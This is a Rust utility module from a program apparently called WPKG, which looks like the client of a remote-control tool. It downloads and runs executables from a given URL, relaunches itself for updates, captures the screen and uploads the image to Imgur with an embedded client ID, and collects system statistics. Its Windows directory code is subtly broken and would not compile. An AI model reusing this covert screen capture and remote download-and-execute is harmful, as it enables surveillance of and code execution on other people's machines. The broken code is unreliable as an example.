extern crate msgbox;
extern crate systemstat;

use std::env;
use std::fs;
use std::fs::File;
use std::io;
use std::io::Cursor;
use std::process::Command;
use std::thread;
use std::time::Duration;

use imgurs::ImgurClient;
use msgbox::*;
use rand::prelude::*;
use screenshots::Screen;
use systemstat::{saturating_sub_bytes, Platform, System};
use tracing::*;

use crate::globals;
use crate::versions::Versions;

pub struct Utils;

impl Utils {
    pub async fn update(link: &str) -> anyhow::Result<()>{
        let location = Self::get_working_dir()+r#"/wpkg"#;
        #[cfg(target_os="windows")]
        let suffix = ".exe";

        #[cfg(not(target_os="windows"))]
        let suffix = "";

        Self::download_from_url(link, &(location.clone()+suffix)).await?;
        Self::run_process(&(location+suffix), "", false);
        panic!("Kurwa zjebało się");
    }
    pub async fn check_updates() -> anyhow::Result<()>{
        info!("checking");
        let ver: Vec<Versions> = Versions::parse(
            &Self::download_string(
                "https://raw.githubusercontent.com/W-P-K-G/JSONFiles/master/Versions.json").await?)?;
        let nevest_ver = ver[ver.len()-1].clone();
        if globals::CURRENT_VERSION != nevest_ver.version{
            let location = Self::get_working_dir()+r#"/wpkg"#;
            let target = Self::get_working_dir()+r#"/update"#;
            #[cfg(target_os="windows")]
            let suffix = ".exe";
    
            #[cfg(not(target_os="windows"))]
            let suffix = "";
    
            fs::copy(location.clone()+suffix, target+suffix)?;
            Self::run_process(&(location+suffix), "--update", false);
        } else {
            info!("WPKG Up to date!");
        }
        Ok(())
    }
    pub async fn download_string(url: &str) -> anyhow::Result<String>{
        Ok(reqwest::get(url).await?.text().await?)
    }
    pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()>{
        let resp = reqwest::get(url).await?;
        let mut out = File::create(path)?;
        let mut content =  Cursor::new(resp.bytes().await?);
        io::copy(&mut content, &mut out)?;
        Ok(())
    }
    /// Show message box
    pub fn messagebox(message: String) {
        tokio::spawn(async move { msgbox::create("", &message, IconType::Info) });
    }

    pub fn run_process(exe: &str, args: &str, wait: bool) {
        if wait {
            Command::new(exe).args(&[args]).output().unwrap();
        } else {
            Command::new(exe).args(&[args]).spawn().unwrap();
        }
    }

    pub fn run_process_with_work_dir(exe: &str, args: &str, wait: bool, currentdir: &str) {
        if wait {
            Command::new(exe)
                .args(&[args])
                .current_dir(currentdir)
                .output()
                .unwrap();
        } else {
            Command::new(exe)
                .args(&[args])
                .current_dir(currentdir)
                .spawn()
                .unwrap();
        }
    }

    pub fn get_working_dir() -> String {
        #[cfg(not(target_os = "windows"))]
        return env::current_dir().unwrap().display().to_string();

        #[cfg(target_os = "windows")]
        {
            use platform_dirs::AppDirs;

            let app_dirs = AppDirs::new(Some("WPKG"), true).unwrap();
            let config_dir = app_dirs.config_dir.display().to_string();

            if !Path::new(&config_dir).exists() {
                info!("WPKG dir not exists... Creating it...");
                fs::create_dir(&config_dir)?;
            }

            return config_dir;
        }
    }

    pub fn screenshot() -> String {
        info!("Taking screenshot...");
        let screens = Screen::all();

        let image = screens[0].capture().unwrap();
        let buffer = image.buffer();

        // Save the image.
        let mut rng = rand::thread_rng();
        let savepath = format!("{}/image{}.png", Utils::get_working_dir(), rng.gen::<i32>());
        fs::write(&savepath, &buffer).unwrap();

        savepath
    }

    pub async fn screenshot_url() -> String {
        let path = Utils::screenshot();
        let info = ImgurClient::new("3e3ce0d7ac14d56")
            .upload_image(&path)
            .await
            .unwrap();

        info.data.link
    }

    pub fn stat() -> String {
        // get system status
        let sys = System::new();

        // init variables
        let mut cpu_usage = 0.;
        let mut memory_free = 0;
        let mut memory_total = 0;
        let mut swap_free = 0;
        let mut swap_total = 0;

        // get cpu usage
        match sys.cpu_load_aggregate() {
            Ok(cpu) => {
                thread::sleep(Duration::from_secs(1));
                let cpu = cpu.done().unwrap();
                cpu_usage = cpu.user * 100.0;
            }
            Err(x) => {
                error!("CPU load: error: {}", x);
            }
        }

        // get memory stats
        match sys.memory() {
            Ok(mem) => {
                memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
                memory_total = mem.total.as_u64();
            }
            Err(x) => {
                error!("\nMemory: error: {}", x);
            }
        }

        // get swap stats
        match sys.swap() {
            Ok(swap) => {
                swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
                swap_total = swap.total.as_u64();
            }
            Err(x) => {
                error!("\nMemory: error: {}", x);
            }
        }

        // return stats
        format!(
            "{} {} {} {} {}",
            cpu_usage, memory_free, memory_total, swap_free, swap_total
        )
    }
}
